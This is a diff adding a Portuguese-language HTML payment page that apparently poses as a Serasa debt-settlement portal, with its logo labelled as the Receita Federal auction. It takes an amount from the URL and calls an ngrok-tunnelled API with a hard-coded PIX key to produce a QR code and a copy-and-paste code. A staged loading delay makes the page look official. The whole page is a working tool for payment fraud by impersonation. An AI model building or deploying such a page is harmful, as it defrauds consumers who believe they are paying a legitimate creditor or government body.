@@ -1,0 +1,303 @@
+
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+  <title>Pagamento</title>
+  <link rel="icon" href="favicon.ico" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Importar a fonte Montserrat do Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    /* Estilos adicionais */
+    body {
+      background-color: #f7f7f7;
+      margin: 0;
+      /* Aplicar a fonte Montserrat ao corpo do documento */
+      font-family: "Montserrat", sans-serif;
+      padding-bottom: 100px;
+    }
+
+    .container {
+      text-align: center;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      margin: 20px;
+    }
+
+    .container p {
+      font-size: 1.2rem;
+      color: #e80070;
+    }
+
+    #qr-code {
+      margin: 0 auto 20px;
+      height: 200px;
+    }
+
+    #pix-key {
+      color: #e80070;
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+    }
+
+    .pix-key-background {
+      background-color: rgba(208, 46, 133, 0.2);
+      padding: 10px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    button {
+      display: flex;
+      width: 100%;
+      /* Ocupa todo o espaço disponível */
+      align-items: center;
+      justify-content: center;
+      height: 60px;
+      background-color: #e80070;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      box-sizing: border-box;
+      /* Respeitar o padding da div pai */
+      margin: 20px;
+      font-family: "Montserrat", sans-serif;
+    }
+
+    footer {
+      display: flex;
+      background-color: white;
+      color: white;
+      text-align: center;
+      /* padding: 20px; */
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      align-items: center;
+      /* Alinha os itens no centro verticalmente */
+    }
+
+
+    button:hover {
+      background-color: #e80070;
+    }
+
+    /* Estilos do cabeçalho e rodapé */
+    header {
+      text-align: center;
+      padding: 20px;
+      background-color: #e80070;
+      color: #fff;
+      border-bottom-right-radius: 16px;
+      border-bottom-left-radius: 16px;
+    }
+
+    header img {
+      display: block;
+      margin: 0 auto;
+    }
+
+    #imagem {
+      filter: brightness(0) invert(1);
+      margin-right: 16px;
+    }
+
+    /* Estilo para o loading */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      /* fundo branco com opacidade */
+      backdrop-filter: blur(10px);
+      /* efeito de blur */
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      /* garantir que fique acima de tudo */
+      visibility: hidden;
+      /* escondido por padrão */
+      opacity: 0;
+      transition: visibility 0s, opacity 0.5s linear;
+      /* animação de transição */
+    }
+
+    .loading-text {
+      font-size: 16px;
+      color: #000000;
+      margin-right: 10px;
+    }
+
+    .loading-icon {
+      color: #e80070;
+      font-size: 48px;
+      /* Tamanho do ícone de loading */
+      margin-bottom: 16px;
+      /* Cor do ícone de loading */
+      animation: spin 1s linear infinite;
+      /* Animação de rotação */
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css" />
+</head>
+
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <i class="fas fa-spinner fa-spin loading-icon"></i>
+    <div class="loading-text">Gerando guia de pagamento para o acordo...</div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/toastify-js@1.11.2"></script>
+  <header>
+    <img width="100px" src="logo.svg" id="qr_code" alt="Logo do Leilão da Receita Federal" />
+    <h2>Pagamento via PIX</h2>
+  </header>
+  <div class="container" id="container">
+
+    <p>
+      Valor do acordo: <strong><span id="valor"></span></strong>
+    </p>
+    <img style="display: none" id="qr-code" alt="QR Code" />
+    <div id="loading" style="display: none; margin: 16px 0">
+      Carregando...
+    </div>
+    <!-- Elemento de carregamento -->
+    <div class="pix-key-background">
+      <p id="pix-key" style="word-wrap: break-word; font-size: 1.1rem">
+        Carregando...
+      </p>
+    </div>
+    <p>
+      <i>*Para realizar o pagamento, abra seu banco, escolha PIX e selecione a
+        opção copia e cola.</i>
+    </p>
+
+  </div>
+
+  <footer>
+    <button onclick="copyPixKey()"><img width="20" id="imagem" class="pix-icon" src="pix.png" alt="Logo">Copiar Chave
+      Pix (copia e cola)</button>
+  </footer>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const valor = urlParams.get("valor");
+    const valorFormatado = parseFloat(valor).toLocaleString("pt-BR", {
+      style: "currency",
+      currency: "BRL",
+    });
+    document.getElementById("valor").innerHTML = valorFormatado;
+
+    // Parâmetros da requisição
+    const params = {
+      chave: "023a7076-9929-4441-a34b-88256f75f5db",
+      valor: valor,
+      beneficiario: "SERASA",
+      cidade: "BRASIL",
+      descricao: "Pagamento acordo Serasa",
+      identificador: "***",
+    };
+
+    // Construir o URL com os parâmetros
+    const url = new URL(
+      "https://wzky.ngrok.app/api/php_qrcode_pix/brcode-json.php"
+    );
+    url.search = new URLSearchParams(params).toString();
+
+    // Exibir o indicador de carregamento
+    document.getElementById("loading").style.display = "block";
+    var chave;
+
+    // Fazer a requisição usando fetch
+
+    const container = document.getElementById('container');
+
+    fetch(url)
+      .then((response) => {
+        if (!response.ok) {
+          throw new Error("Erro ao gerar QR code");
+        }
+        return response.json(); // Obter o conteúdo como JSON
+      })
+      .then((data) => {
+        console.log(data); // Lidar com os dados recebidos da API
+
+        // Ocultar o indicador de carregamento
+        document.getElementById("loading").style.display = "none";
+
+        chave = data.brcode;
+        document.getElementById("pix-key").innerHTML = data.brcode;
+        document.getElementById("qr-code").style.display = "block";
+        document.getElementById("qr-code").src = data.imagem;
+      })
+      .catch((error) => {
+        console.error("Erro:", error);
+        // Lidar com o erro
+
+        // Ocultar o indicador de carregamento em caso de erro
+        document.getElementById("loading").style.display = "none";
+      });
+
+    // Função para copiar a chave Pix para a área de transferência
+    function copyPixKey() {
+      var pixKey = chave; // Substitua pelo valor da sua chave Pix
+      navigator.clipboard
+        .writeText(pixKey)
+        .then(() => {
+          Toastify({
+            text: "Chave Pix copiada com sucesso",
+            backgroundColor: "#4CAF50",
+            gravity: 'top',
+            position: 'center',
+            duration: 6000,
+          }).showToast();
+        })
+        .catch((err) => {
+          console.error("Erro ao copiar a chave Pix: ", err);
+        });
+    }
+
+    // Seleciona o elemento do loading overlay
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    // Mostra o loading overlay
+    loadingOverlay.style.visibility = 'visible';
+    loadingOverlay.style.opacity = '1';
+    container.style.visibility = 'hidden';
+    container.style.opacity = '0';
+
+    // Define a função para esconder o loading após 6 segundos
+    setTimeout(() => {
+      container.style.visibility = 'visible';
+      container.style.opacity = '1';
+      loadingOverlay.style.visibility = 'hidden';
+      loadingOverlay.style.opacity = '0';
+    }, 6000); // 6000 milissegundos = 6 segundos
+  </script>
+</body>
+
+</html>
